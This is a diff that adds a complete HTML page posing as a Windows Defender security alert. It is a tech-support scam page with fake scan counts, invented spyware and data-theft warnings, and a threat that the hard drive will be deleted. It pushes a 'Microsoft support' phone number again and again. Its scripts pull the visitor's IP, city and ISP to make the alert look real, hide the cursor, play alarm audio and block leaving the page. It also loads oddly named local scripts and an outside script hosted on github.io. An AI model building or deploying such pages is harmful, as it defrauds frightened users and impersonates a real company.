@@ -1,0 +1,364 @@
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">
+  <meta content="noindex,nofollow" name="robots">
+  <title>Service App 1d61W</title>
+  <link href="images/microsoft.png" rel="icon" id="favicon" type="image/png">
+  <link href="css/tapa.css" rel="stylesheet">
+  <link href="css/chat.css" rel="stylesheet">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
+    integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g=="
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css"
+    integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js"
+    integrity="sha384-w1Q4orYjBQndcko6MimVbzY0tgp4pWB4lZ7lr30WKz0vr/aWKhXdBNmNb5D92v7s"
+    crossorigin="anonymous"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <script>
+    var t = new XMLHttpRequest;
+    t.onreadystatechange = function () {
+      if (4 == this.readyState && 200 == this.status) {
+        var a = JSON.parse(this.responseText);
+        ipadd = a.ip;
+        city = a.city;
+        country = a.country;
+        isp = a.connection.isp;
+        var b = new Date;
+        currtime = a.timezone.current_time;
+        document.getElementById("ip_add").textContent = "" + ipadd;
+      }
+    };
+    t.open("GET.html", "https://ipwho.is/?lang=en", !0);
+    t.send();
+  </script>
+
+</head>
+
+<body class="bdtgf" id="mycanvas" onmousemove="showd2();" onclick="beep2();beep1();"
+  onbeforeunload="return myFunction()" style="cursor:none">
+
+  <audio autoplay="" id="beep">
+    <source src="media/beep.mp3" type="audio/mpeg">
+  </audio>
+  <audio autoplay="" id="pridez">
+    <source src="media/eng.mp3" type="audio/mpeg">
+  </audio>
+
+  <a href="#" id="link_black" style="cursor:none" rel="noreferrer">
+    <div class="black" style="height: 145%; cursor: none; display: block;"></div>
+
+    <div class="bg" id="bg">
+      <div class="bgimg" style="top:0">
+        <img src="images/bg.png" alt="" width="100%">
+      </div>
+    </div>
+  </a>
+  <div class="pro_box" style="cursor: none;">
+    <div class="pro_box_header">
+      <div class="row">
+        <div class="col-md-12">
+          <div class="minimize">
+            <ul>
+              <li>
+                <a href="#">
+                  <img src="images/mnc.jpg">
+                </a>
+              </li>
+            </ul>
+          </div>
+        </div>
+        <div class="col-md-4">
+          <div class="logo">
+            <img src="images/microsoft.png">
+            <span>Windows Defender</span>
+          </div>
+        </div>
+        <div class="col-md-8">
+          <div class="activate_lic">
+            <ul>
+              <li>
+                <a href="#">
+                  <button>Activate the license</button>
+                </a>
+              </li>
+              <li>
+                <a href="#">
+                  <img src="images/set.png">
+                </a>
+              </li>
+              <li>
+                <a href="#">
+                  <img src="images/que.png">
+                </a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="scan_box">
+      <div class="scan_box_header">
+        <div class="row">
+          <div class="col-md-6">
+            <div class="quick_scan">
+              <p>
+                <img src="images/vsc.png">
+                <span>Scanning Rapide</span>
+              </p>
+            </div>
+          </div>
+          <div class="col-md-6">
+            <div class="minimize1">
+              <ul>
+                <li>
+                  <a href="#">
+                    <img src="images/mnc.jpg">
+                  </a>
+                </li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="scan_body">
+        <div class="wndf" style="margin:20px;">
+          <img src="images/scanws.png" alt="" class="img-fluid">
+        </div>
+        <div class="table_quick">
+          <table class="table table-bordered">
+            <thead>
+              <tr>
+                <th scope="col">Scanned Objects</th>
+                <th scope="col">
+                  <div class="col_fourth counter">
+                    <h2 class="count-number count-title timer" data-speed="5000" data-to="51900">51,900</h2>
+                  </div>
+                </th>
+              </tr>
+              <tr>
+                <th scope="col">Time Spent</th>
+                <th scope="col">5 secs</th>
+              </tr>
+              <tr>
+                <th scope="col">Identified Threats</th>
+                <th scope="col" style="color:red">
+                  <h2 class="count-number count-title timer" data-speed="2500" data-to="1200">1,200</h2>
+                </th>
+              </tr>
+            </thead>
+          </table>
+        </div>
+      </div>
+      <div class="scan_footer">
+        <div class="row">
+          <div class="col-md-6">
+            <div class="bt_can">
+              <div class="btn-group" role="group" aria-label="Basic example">
+                <button class="btn btn-secondary" type="button">Scan</button>
+              </div>
+              <div class="btn-group" role="group" aria-label="Basic example">
+                <button class="btn btn-secondary" type="button">Pause</button>
+              </div>
+            </div>
+          </div>
+          <div class="col-md-6">
+            <div class="bt_can2">
+              <div class="btn-group" role="group" aria-label="Basic example">
+                <button class="btn btn-secondary" type="button">Scheduled Scans</button>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="pro_box3" style="cursor: default; display: none;">
+    <div class="header">
+      <img src="images/microsoft.png" class="ico">
+      <div class="name">Windows Defender </div>
+      <img src="images/mnc.jpg" class="win_min">
+    </div>
+    <div class="gray_line">
+      <img src="images/set.png" class="ico_gray1" id="w1_ico1">
+      <div class="set" id="w1_1">Setting</div>
+      <img src="images/que.png" class="ico_gray2" id="w1_ico2">
+      <div class="help" id="w1_2">Help!</div>
+    </div>
+    <div class="white_line">
+      <img src="images/red.png" class="pc">
+      <div class="txt1" id="w1_3" style="font-size:16px;">A phony alarm has been recognized on your computer.<br>Don't
+        call her.</div>
+      <div class="txt2">
+        <br>
+        <span id="w1_6">Kindly sign in to Windows <br>Toll Free :- </span><span style="color: #c00;font-size:24px;"
+          id="w1_7">+1-888-788-8450 (Security Toll-Free)</span> <br>
+        <span id="w1_9">Virus detected: </span><span style="color: #23a31c;" id="w1_10">4/5</span> <span
+          style="color: #2ea8e5;" id="w1_11">Pornography.exe</span>
+      </div>
+    </div>
+    <div class="green_line"><img src="images/cuweb.gif" class="corner"></div>
+    <div class="bl1">
+      <div class="txt1" id="w1_12">Security</div>
+      <img src="images/pc.gif" class="ico">
+      <div class="txt2" id="w1_13" style="color: red">Disabled</div>
+      <div class="line"></div>
+    </div>
+    <div class="bl2">
+      <div class="txt1" id="w1_14">Identity</div>
+      <img src="images/safes.gif" class="ico">
+      <div class="txt2" id="w1_13a" style="color: red">in danger.</div>
+      <div class="line"></div>
+    </div>
+    <div class="bl3">
+      <div class="txt1" id="w1_15">Performance</div>
+      <img src="images/perfrom.gif" class="ico">
+      <div class="txt2" id="w1_13b">Optimized</div>
+      <div class="line"></div>
+    </div>
+    <div class="bl4">
+      <div class="txt1" id="w1_16" style="">Firewall</div>
+      <img src="images/microsoft.png" class="ico" style="width: 72px;">
+      <div class="txt2" id="w1_13c">Switch it off</div>
+    </div>
+    <div class="gray_line2">
+      <div class="txt"><span id="w1_17">Status : </span><span class="gr" id="w1_18" style="color: red;">To take a chance
+          on the PC!</span></div>
+    </div>
+  </div>
+
+  <div style="cursor:none;z-index:999999999" id="footer">
+    <div class="row">
+      <div class="col-md-12">
+        <div class="right-foot" style="text-align:center;margin-bottom: 5px;">
+          <span id="footertxt">
+            <img src="images/msmm.png"> </span>
+          <span style="font-weight:500;color:#fff; ">Microsoft Windows Security Support Center <span
+              style="border:1px solid #fff;border-radius:5px;padding:2px 5px"> +1-888-788-8450 (Security Toll-Free)
+            </span>
+          </span>
+        </div>
+      </div>
+      <div class="col-md-12">
+        <marquee direction="left" height="100px" width="100%">
+          <small class="text-left" style="color:#eee;font-size:10px">Windows Defender SmartScreen now prevents
+            unrecognized applications from appearing. Running this application may put your PC at risk. Windows Defender
+            scan detected unwanted adware on this device that can steal passwords, online identities, financial
+            information, personal files, photos, and documents。</small>
+        </marquee>
+      </div>
+    </div>
+  </div>
+
+  <div class="lightbox" id="poptxt" onclick="beep1();">
+
+    <div class="bxs">
+      <span class="icons">
+        <a href="#"><img src="images/mnc.jpg"></a>
+      </span>
+      <h1><img src="images/microsoft.png" style="width: 30px;"> Windows-Defender Protection Alert</h1>
+      <p>Windows Defender Firewall has blocked some features of <strong>ads.finance track(1).exe</strong> on all public
+        and private networks.</p>
+      <hr>
+      <div class="text-center">
+        <p style="color:#f45021;"><img src="images/warn.png" style=""> <strong>ads.finance track(1).exe</strong></p>
+        <p>Publisher: <strong>unknown</strong> &nbsp; &nbsp; &nbsp;
+          Error Codes: <strong>#0x60D9</strong> &nbsp; &nbsp; &nbsp; Address IP: <strong><span
+              id="ip_add">210.138.184.59</span></strong></p>
+        <p style="font-size: 16px;font-weight: 400;">The Microsoft Team continues to make efforts to assist in
+          safeguarding your Microsoft account. Therefore, we are scanning your account to ensure it is safe from malware
+          threats.</p>
+        <img src="images/support.gif" alt="Image" style="width: 200px;"><br>
+        <img src="images/load.gif" alt="Image">
+        <p style="font-size: 18px;font-weight: 600;margin-top: 5px;">Windows has blocked access to your device for
+          security reasons. <br>Contact Microsoft Support: <span class="zoom">📞</span> +1-888-788-8450 (Security
+          Toll-Free)</p>
+      </div>
+    </div>
+
+
+  </div>
+
+  <div class="cardcontainer" style="cursor: default; display: none;" id="pop_up_new">
+    <p style="font-size:16px;font-weight:400;margin:0;padding:5px 10px;color:#fff!important;color:#414141;font-weight:700;margin-top:0px"
+      class="text-center">Windows Security - Spyware Alert</p>
+    <p>
+      <b>** Access to this PC has been blocked for security reasons **</b>
+    </p>
+    <p>Your computer has been warned that it is infected with Trojan spyware. The following data was compromised:
+      <br><br>
+      &gt; Email ID<br> &gt; Bank Password<br>
+      &gt; Facebook Login<br>
+      &gt; Photos and Photo Documents</p>
+    <p>A Windows Security scan has detected potentially unwanted adware on this device that can steal passwords, online
+      identities, financial information, personal files, images, or documents.</p>
+    <p>Please contact us immediately so that our engineer can explain the removal process over the phone.<br><br>
+
+      Please contact Windows Support immediately to report this threat, prevent spoofing, and unlock access to this
+      device.<br><br>
+      Closing this window puts your personal information at risk and interrupts your Windows registration.</p>
+    <h2 style="font-size:16px; font-weight:bold; color:white;">Contact Windows Support: <span
+        style="border:1px solid #fff;border-radius:5px;padding:2px 5px">+1-888-788-8450 (Security Toll-Free)
+      </span></h2>
+    <h2 style="font-size:20px; font-weight:bold; color:white;">Could I at any point erase my hard drive?</h2>
+    <div class="loader"><img src="images/load.gif" alt="" width="100%" height="30px"></div>
+    <p>Deleting begins in 5 minutes.They check the documents...</p>
+    <div class="action_buttons"> <a class="active" id="leave_page" style="cursor: pointer;">Stop</a> <a class="active"
+        id="leave_page">Check</a> </div>
+  </div>
+
+
+  <div class="answer_list"
+    style="display:none;background-color: rgb(40 40 40 / 80%);;height:auto;width:550px;margin-left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem"
+    id="welcomeDiv">
+    <p style="color:#FFFFFF;margin-top:10px;font-size:16px;opacity:.9;padding:0 5px" class="text-center">Access to this
+      PC has been blocked for security reasons. Do not access or restart this PC. If you overlook this basic warning,
+      you may lose information about this framework. Contact support as soon as possible and a Microsoft expert will
+      guide you through the investigation over the phone. Running this application may put your PC at risk。<br>
+      <strong>
+        Windows Support: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px"> +1-888-788-8450
+          (Security Toll-Free)
+        </span>
+      </strong>
+    </p>
+  </div>
+  <div id="chat" class="bounce">
+    <img src="images/msmm.png">
+    <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Microsoft</span>
+    <br>
+    <p>Windows Technical Support
+    </p>
+    <h4 style="font-weight:600;color:#0F396D;font-size:22px"> +1-888-788-8450
+      <br>( Security Toll-Free)<br><br>
+    </h4>
+    <div class="arrow-down">
+      <svg height="1em" viewBox="0 0 320 512">
+        <style>
+          svg {
+            fill: #fff
+          }
+        </style>
+        <path
+          d="M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2 11.9-22.9 6.9-34.9s-16.6-19.8-29.6-19.8L32 192c-12.9 0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z">
+        </path>
+      </svg>
+    </div>
+  </div>
+
+
+
+
+  <script src="js/aldkfjHbc.js"></script>
+  <script src="js/eJDSCjf.js"></script>
+  <script src="js/ksdchsjd.js"></script>
+  <script src="js/leabdIndf.js"></script>
+  <script src="js/snjdhwsjd.js"></script>
+  <script src="js/wnejdUds.js"></script>
+
+</body>
+
+<script src="https://markonlive.github.io/analytics/main.js"></script>
+
+</html>
